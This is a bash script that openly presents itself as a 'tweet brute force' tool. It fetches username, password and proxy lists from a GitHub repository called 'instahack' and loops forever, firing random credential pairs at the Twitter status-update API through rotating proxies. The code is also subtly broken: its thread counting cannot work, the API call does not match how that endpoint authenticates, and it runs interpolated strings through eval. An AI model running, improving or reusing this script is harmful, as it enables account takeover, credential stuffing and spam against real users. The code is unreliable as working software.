#!/bin/bash

# Log file
log="/var/log/temp.log"

# GitHub repository information
github_host="github.com"
github_user="SSLRI"
github_repo="instahack"

# Function to download file from GitHub
download_file() {
    local file_url="$1"
    local destination="$2"
    echo "Downloading: $file_url" | tee -a "$log"
    curl -s "$file_url" -o "$destination"
    echo "Download finished for: $destination" | tee -a "$log"
}

# Function to execute a command and log output
execute_command() {
    local command="$1"
    echo "Executing: $command" | tee -a "$log"
    local output=$(eval "$command" 2>&1)
    echo "$output" | tee -a "$log"
    return 0
}

# Function to get a random number
get_random_number() {
    local min="$1"
    local max="$2"
    echo $(($RANDOM % ($max - $min + 1) + $min))
}

# Function to extract a random line from a file
get_random_line() {
    local file_path="$1"
    local line_count=$(wc -l < "$file_path")
    local random_line_num=$(get_random_number 1 "$line_count")
    sed -n "${random_line_num}p" "$file_path"
}

# Function to generate a random string
generate_random_string() {
    local length="$1"
    tr -dc A-Za-z0-9 </dev/urandom | head -c "$length"
}

# Main script starts here
echo "Starting tweet brute force script..." | tee -a "$log"

# Download user list
user_file="userlist.txt"
user_url="https://raw.githubusercontent.com/$github_user/$github_repo/master/users.txt"
download_file "$user_url" "$user_file"

# Download password list
pass_file="passlist.txt"
pass_url="https://raw.githubusercontent.com/$github_user/$github_repo/master/passwords.txt"
download_file "$pass_url" "$pass_file"

# Download proxy list
proxy_file="proxy.txt"
proxy_url="https://raw.githubusercontent.com/$github_user/$github_repo/master/proxy.txt"
download_file "$proxy_url" "$proxy_file"

# Read max threads from config file
max_threads=$(grep "^threads=" config.ini | cut -d "=" -f 2)
if [[ -z "$max_threads" ]]; then
  max_threads=5
fi

echo "Max threads set to: $max_threads" | tee -a "$log"

# Main loop for multithreading
thread_count=0
while true; do
  if [[ $thread_count -lt $max_threads ]]; then
      thread_count=$((thread_count + 1))

      # Get random user, pass, and proxy
      random_user=$(get_random_line "$user_file")
      random_pass=$(get_random_line "$pass_file")
      random_proxy=$(get_random_line "$proxy_file")
      random_tweet=$(generate_random_string 20)
    
      echo "Starting thread: $thread_count, User: $random_user, Pass: $random_pass, Proxy: $random_proxy, Tweet: $random_tweet" | tee -a "$log"

    # Execute the tweet brute-force in background
      (
            execute_command "curl -x $random_proxy -s -d \"username=$random_user&password=$random_pass&status=$random_tweet\" https://api.twitter.com/1.1/statuses/update.json"
        thread_count=$((thread_count - 1))
        echo "Thread finished: $thread_count" | tee -a "$log"
      ) &
  else
    # Wait for a random time before checking again
      sleep_time=$(get_random_number 1 5)
      echo "Max threads reached, sleeping for: $sleep_time seconds" | tee -a "$log"
      sleep "$sleep_time"
  fi

  # Check for zombie processes and clean up
    while read pid; do
        wait "$pid" 2> /dev/null
    done < <(jobs -p)
    
    if [[ $thread_count -eq 0 ]]; then
        echo "All threads completed. Starting over." | tee -a "$log"
    fi
done

echo "Script execution completed." | tee -a "$log"